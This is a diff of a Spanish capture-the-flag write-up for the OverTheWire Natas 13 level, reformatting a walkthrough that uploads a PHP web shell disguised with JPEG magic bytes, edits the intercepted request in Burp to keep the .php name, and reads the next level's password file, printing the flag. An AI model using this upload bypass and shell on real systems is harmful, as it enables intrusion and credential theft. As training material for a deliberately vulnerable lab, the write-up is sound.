@@ -131,6 +131,9 @@ Bueno ya tenemos el fichero **phpShell.php** recién salido del horno con los **
 
 Configuramos el **Proxy** a **localhost:8080** en el navegador y arrancamos el **BURP** para interceptar el tráfico que enviamos y poder modificarlo posteriormente y saltarnos los controles de acceso.
 
+Interceptamos el tráfico y nos fijamos en el valor **phvidqtoy7.jpg** 
+
+```html
 POST /index.php HTTP/1.1
 Host: natas13.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
@@ -158,45 +161,48 @@ Content-Type: application/x-php
 ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
 -----------------------------453852881298197434201962635--
 
+````
 
+Cambiamos el valor de ese campo:
 
+```php
+phvidqtoy7.jpg -> phpShell.php
+```
 
-POST /index.php HTTP/1.1
-Host: natas13.natas.labs.overthewire.org
-User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://natas13.natas.labs.overthewire.org/
-Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
-Connection: close
-Content-Type: multipart/form-data; boundary=---------------------------453852881298197434201962635
-Content-Length: 531
+Quedando el código así:
 
------------------------------453852881298197434201962635
-Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-1000
+```html
+...
 -----------------------------453852881298197434201962635
 Content-Disposition: form-data; name="filename"
 
-phvidqtoy7.jpg
------------------------------453852881298197434201962635
-Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
-Content-Type: application/x-php
+phpShell.php
+...
+```
 
-ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
------------------------------4538528812981974342
+Una vez modificado, pulsamos **FORWARD** en **BURP** y vemos que hemos pasado el filtro correctamente :smile:
 
-
-
-
+```html
 The file upload/7nu704t5gn.php has been uploaded
+```
 
+Accedemos a la [URL](http://natas13.natas.labs.overthewire.org/upload/7nu704t5gn.php) y nos muestra la contraseña del siguiente nivel :sunglases: :beer:
 
+```html
 http://natas13.natas.labs.overthewire.org/upload/7nu704t5gn.php
+```
 
+Texto mostrado:
+
+```html
 ÿØÿàLg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+
+NOTA: En el texto que nos ha aparecido, vemos unos caracteres raros **ÿØÿà** pero no le hacemos caso y cogemos el resto de la cadena
+
+**FLAG** = {Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1}
+
+
 
 
 
